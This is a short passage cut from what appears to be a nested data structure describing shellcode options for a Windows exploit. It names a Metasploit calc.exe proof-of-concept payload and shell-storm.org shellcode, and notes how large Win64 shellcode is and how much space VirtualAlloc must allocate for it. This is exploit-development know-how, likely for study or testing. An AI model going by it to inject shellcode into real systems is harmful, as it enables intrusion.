                                    'windows/x64/exec CMD="calc.exe" (PoC)',
                                    'Custom shellcode from shell-storm.org'
                                ],
                                'notes': 'Win64 shellcode is larger than x86 (~350-500 bytes). Ensure VirtualAlloc allocates enough space (0x1000 = 4096 bytes safe).'
                            }
                        }
                    ]
                }
            ]
        }
